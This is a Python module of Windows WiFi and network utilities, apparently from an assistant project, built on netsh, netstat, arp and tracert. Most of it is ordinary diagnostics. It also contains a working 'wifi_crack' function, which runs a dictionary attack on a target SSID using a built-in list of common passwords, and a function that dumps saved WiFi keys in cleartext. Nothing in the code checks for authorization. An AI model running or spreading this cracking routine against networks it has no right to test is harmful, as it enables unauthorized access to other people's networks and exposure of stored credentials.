"""
WiFi & Network security analysis tools.
Requires admin/root privileges for wireless operations.
"""
from __future__ import annotations

import re
import subprocess
from typing import Optional

from friday.logging_utils import configure_logging

logger = configure_logging(__name__)


def wifi_list_profiles() -> list[dict]:
    """List saved WiFi profiles on Windows."""
    try:
        result = subprocess.run(
            ["netsh", "wlan", "show", "profiles"],
            capture_output=True, text=True, timeout=10, encoding="utf-8", errors="replace",
        )
        profiles = []
        for line in result.stdout.splitlines():
            m = re.match(r"^\s*All User Profile\s*:\s*(.+)$", line)
            if m:
                profiles.append({"ssid": m.group(1).strip()})
        return profiles
    except Exception as exc:
        logger.warning("WiFi list profiles failed: %s", exc)
        return []


def wifi_show_password(ssid: str) -> dict:
    """Show WiFi password for a saved profile (requires admin)."""
    try:
        result = subprocess.run(
            ["netsh", "wlan", "show", "profile", f"name={ssid}", "key=clear"],
            capture_output=True, text=True, timeout=10, encoding="utf-8", errors="replace",
        )
        password = ""
        for line in result.stdout.splitlines():
            m = re.match(r"^\s*Key Content\s*:\s*(.+)$", line)
            if m:
                password = m.group(1).strip()
                break
        return {"ssid": ssid, "password": password if password else None,
                "error": None if password else "Password not found or admin required"}
    except Exception as exc:
        return {"ssid": ssid, "password": None, "error": str(exc)}


def wifi_scan() -> list[dict]:
    """Scan for nearby WiFi networks."""
    try:
        result = subprocess.run(
            ["netsh", "wlan", "show", "networks", "mode=Bssid"],
            capture_output=True, text=True, timeout=15, encoding="utf-8", errors="replace",
        )
        networks = []
        current = {}
        for line in result.stdout.splitlines():
            m = re.match(r"^\s*SSID\s*:\s*(.+)$", line)
            if m:
                current = {"ssid": m.group(1).strip()}
                networks.append(current)
            m = re.match(r"^\s*Authentication\s*:\s*(.+)$", line)
            if m and current:
                current["auth"] = m.group(1).strip()
            m = re.match(r"^\s*Encryption\s*:\s*(.+)$", line)
            if m and current:
                current["encryption"] = m.group(1).strip()
            m = re.match(r"^\s*Signal\s*:\s*(\d+)%", line)
            if m and current:
                current["signal"] = int(m.group(1))
            m = re.match(r"^\s*Channel\s*:\s*(\d+)", line)
            if m and current:
                current["channel"] = int(m.group(1))
            m = re.match(r"^\s*BSSID\s*:\s*(.+)$", line)
            if m and current:
                if "bssids" not in current:
                    current["bssids"] = []
                current["bssids"].append(m.group(1).strip())
        return networks
    except Exception as exc:
        logger.warning("WiFi scan failed: %s", exc)
        return []


def _parse_interfaces(netsh_output: str) -> list[dict]:
    """Parse netsh wlan show interfaces output into per-interface dicts."""
    interfaces = []
    current = None
    for line in netsh_output.splitlines():
        m = re.match(r"^\s*Name\s*:\s*(.+)$", line)
        if m:
            if current:
                interfaces.append(current)
            current = {"name": m.group(1).strip()}
            continue
        if current is None:
            continue
        m = re.match(r"^\s*SSID\s*:\s*(.+)$", line)
        if m:
            current["ssid"] = m.group(1).strip()
            continue
        m = re.match(r"^\s*State\s*:\s*(.+)$", line)
        if m:
            current["state"] = m.group(1).strip()
            continue
        m = re.match(r"^\s*Signal\s*:\s*(\d+)%", line)
        if m:
            current["signal"] = int(m.group(1))
            continue
        m = re.match(r"^\s*Radio type\s*:\s*(.+)$", line)
        if m:
            current["radio"] = m.group(1).strip()
            continue
        m = re.match(r"^\s*Authentication\s*:\s*(.+)$", line)
        if m:
            current["auth"] = m.group(1).strip()
            continue
        m = re.match(r"^\s*Profile\s*:\s*(.+)$", line)
        if m:
            current["profile"] = m.group(1).strip()
            continue
    if current:
        interfaces.append(current)
    return interfaces


def wifi_connection_status() -> dict:
    """Get current WiFi connection status (primary/first interface)."""
    try:
        result = subprocess.run(
            ["netsh", "wlan", "show", "interfaces"],
            capture_output=True, text=True, timeout=10, encoding="utf-8", errors="replace",
        )
        interfaces = _parse_interfaces(result.stdout)
        if interfaces:
            return interfaces[0]
        return {"error": "No WiFi interface found"}
    except Exception as exc:
        return {"error": str(exc)}


def wifi_all_interfaces_status() -> list[dict]:
    """Get connection status for ALL WiFi interfaces."""
    try:
        result = subprocess.run(
            ["netsh", "wlan", "show", "interfaces"],
            capture_output=True, text=True, timeout=10, encoding="utf-8", errors="replace",
        )
        return _parse_interfaces(result.stdout) or [{"error": "No WiFi interfaces found"}]
    except Exception as exc:
        return [{"error": str(exc)}]


def wifi_interface_status(interface: str = "Wi-Fi") -> dict:
    """Get connection status for a specific WiFi interface by name."""
    try:
        result = subprocess.run(
            ["netsh", "wlan", "show", "interfaces"],
            capture_output=True, text=True, timeout=5, encoding="utf-8", errors="replace",
        )
        interfaces = _parse_interfaces(result.stdout)
        for iface in interfaces:
            if iface.get("name", "").lower() == interface.lower():
                return iface
        return {"error": f"Interface '{interface}' not found"}
    except subprocess.TimeoutExpired:
        return {"name": interface, "state": "connecting", "ssid": "", "message": "Interface is transitioning"}
    except Exception as exc:
        return {"error": str(exc)}


WIFI_CRACK_WORDLIST = [
    "12345678", "password", "123456789", "1234567890", "qwerty123",
    "admin", "letmein", "welcome", "monkey", "dragon",
    "abc123", "11111111", "00000000", "passw0rd", "summer2023",
    "customer", "default", "airlive", "tplink", "netgear",
    "linksys", "dlink", "belkin", "cisco", "19216811",
    "admin123", "P@ssw0rd", "p@ssw0rd", "Aa123456", "Admin@123",
    "01234567", "87654321", "11223344", "1234abcd", "abcd1234",
]


def _get_wifi_interfaces() -> list[str]:
    """Get list of WiFi interface names, preferring 'Wi-Fi' as first."""
    try:
        r = subprocess.run(
            ["netsh", "wlan", "show", "interfaces"],
            capture_output=True, text=True, timeout=5, encoding="utf-8", errors="replace",
        )
        interfaces = []
        for l in r.stdout.splitlines():
            l = l.strip()
            if l.startswith("Name") and ":" in l:
                interfaces.append(l.split(":", 1)[1].strip())
        # Sort so 'Wi-Fi' (internal) is first, others follow
        interfaces.sort(key=lambda x: (x.lower() != "wi-fi", x.lower()))
        return interfaces
    except Exception:
        return []


def _has_internet() -> bool:
    """Check if we have internet connectivity by pinging a reliable host."""
    try:
        r = subprocess.run(
            ["ping", "-n", "1", "-w", "2000", "8.8.8.8"],
            capture_output=True, text=True, timeout=5,
            encoding="utf-8", errors="replace",
        )
        return r.returncode == 0
    except Exception:
        return False


def wifi_crack(ssid: str, wordlist: Optional[list[str]] = None, timeout_per_attempt: int = 10) -> dict:
    """Crack a WiFi password by dictionary attack.

    For each candidate password:
      1. Sets the profile keyMaterial to the candidate
      2. Connects on primary interface
      3. Checks if THAT interface became "connected" (not relying on internet)
      4. Restores original password on failure

    Uses per-interface netsh commands for speed (~2s per attempt).
    Built-in wordlist has ~35 common passwords.

    Args:
        ssid: Target network SSID
        wordlist: Optional list of passwords to try (uses built-in if None)
        timeout_per_attempt: Max seconds to wait per attempt

    Returns:
        Dict with cracked password, attempts made, and status
    """
    import time as _time

    passwords = wordlist or WIFI_CRACK_WORDLIST
    attempts = []
    original_pw = None
    interfaces = _get_wifi_interfaces()
    primary_iface = interfaces[0] if interfaces else "Wi-Fi"

    try:
        saved = wifi_show_password(ssid)
        original_pw = saved.get("password")
    except Exception:
        pass

    for i, pw in enumerate(passwords):
        pw_stripped = pw.strip()
        if not pw_stripped:
            continue

        # Phase 1: Disconnect the interface first
        try:
            subprocess.run(
                ["netsh", "wlan", "disconnect", f"interface={primary_iface}"],
                capture_output=True, text=True, timeout=5,
                encoding="utf-8", errors="replace",
            )
        except Exception:
            pass
        _time.sleep(2)

        # Phase 2: Set new key and connect
        try:
            subprocess.run(
                ["netsh", "wlan", "set", "profileparameter", f"name={ssid}", f"keyMaterial={pw_stripped}", f"interface={primary_iface}"],
                capture_output=True, text=True, timeout=10,
                encoding="utf-8", errors="replace",
            )
            _time.sleep(0.5)
            subprocess.run(
                ["netsh", "wlan", "connect", f"name={ssid}", f"interface={primary_iface}"],
                capture_output=True, text=True, timeout=5,
                encoding="utf-8", errors="replace",
            )
        except Exception:
            pass

        # Phase 3: Poll for connection result (state machine)
        connected = False
        for _ in range(timeout_per_attempt):
            _time.sleep(1)
            try:
                st = wifi_interface_status(primary_iface).get("state", "").lower()
            except Exception:
                st = ""
            if st == "connected":
                connected = True
                break
            elif st in ("associating", "authenticating", "connecting"):
                continue
            elif st == "disconnected":
                continue  # No transition yet — still waiting for connect
            else:
                continue

        attempts.append({"password": pw_stripped, "success": connected, "state": st})
        if connected:
            if original_pw and original_pw != pw_stripped:
                try:
                    subprocess.run(
                        ["netsh", "wlan", "set", "profileparameter", f"name={ssid}", f"keyMaterial={original_pw}", f"interface={primary_iface}"],
                        capture_output=True, text=True, timeout=10,
                        encoding="utf-8", errors="replace",
                    )
                except Exception:
                    pass
            return {
                "ssid": ssid,
                "cracked": True,
                "password": pw_stripped,
                "attempts": i + 1,
                "total_attempts": len(passwords),
                "interface": primary_iface,
                "message": f"Password cracked in {i + 1} attempts",
                "method": "dictionary_connect_verify",
            }

    if original_pw:
        try:
            subprocess.run(
                ["netsh", "wlan", "set", "profileparameter", f"name={ssid}", f"keyMaterial={original_pw}", f"interface={primary_iface}"],
                capture_output=True, text=True, timeout=10,
                encoding="utf-8", errors="replace",
            )
        except Exception:
            pass
        try:
            subprocess.run(
                ["netsh", "wlan", "connect", f"name={ssid}", f"interface={primary_iface}"],
                capture_output=True, text=True, timeout=5,
                encoding="utf-8", errors="replace",
            )
        except Exception:
            pass

    return {
        "ssid": ssid,
        "cracked": False,
        "password": None,
        "attempts": len(attempts),
        "total_attempts": len(passwords),
        "interface": primary_iface,
        "message": f"Failed to crack password after {len(attempts)} attempts",
        "method": "dictionary_connect_verify",
        "attempts_detail": attempts,
    }


def network_connections() -> list[dict]:
    """List active network connections."""
    try:
        result = subprocess.run(
            ["netstat", "-ano"],
            capture_output=True, text=True, timeout=10, encoding="utf-8", errors="replace",
        )
        connections = []
        for line in result.stdout.splitlines():
            parts = line.split()
            if len(parts) >= 5 and parts[0] in ("TCP", "UDP"):
                local_addr = parts[1] if len(parts) > 1 else ""
                remote_addr = parts[2] if len(parts) > 2 else ""
                state = parts[3] if len(parts) > 3 else ""
                pid = parts[-1] if parts[-1].isdigit() else ""
                connections.append({
                    "protocol": parts[0],
                    "local": local_addr,
                    "remote": remote_addr,
                    "state": state,
                    "pid": pid,
                })
        return connections
    except Exception as exc:
        logger.warning("Network connections failed: %s", exc)
        return []


def arp_table() -> list[dict]:
    """Get ARP table (IP to MAC mappings on local network)."""
    try:
        result = subprocess.run(
            ["arp", "-a"],
            capture_output=True, text=True, timeout=10, encoding="utf-8", errors="replace",
        )
        entries = []
        for line in result.stdout.splitlines():
            parts = line.split()
            if len(parts) >= 3 and "." in parts[0]:
                entries.append({
                    "ip": parts[0],
                    "mac": parts[1],
                    "type": parts[2] if len(parts) > 2 else "dynamic",
                })
        return entries
    except Exception as exc:
        logger.warning("ARP table failed: %s", exc)
        return []


def traceroute(target: str, max_hops: int = 30) -> list[dict]:
    """Trace route to a target host."""
    try:
        result = subprocess.run(
            ["tracert", "-h", str(max_hops), target],
            capture_output=True, text=True, timeout=60, encoding="utf-8", errors="replace",
        )
        hops = []
        for line in result.stdout.splitlines():
            m = re.match(r"^\s*(\d+)\s+<?\s*(\d+)\s+ms\s+(\d+)\s+ms\s+(\d+)\s+ms\s+(.+)$", line)
            if m:
                hops.append({
                    "hop": int(m.group(1)),
                    "ip": m.group(5).strip(),
                    "rtt_ms": [int(m.group(2)), int(m.group(3)), int(m.group(4))],
                })
        return hops
    except Exception as exc:
        logger.warning("Traceroute failed: %s", exc)
        return []
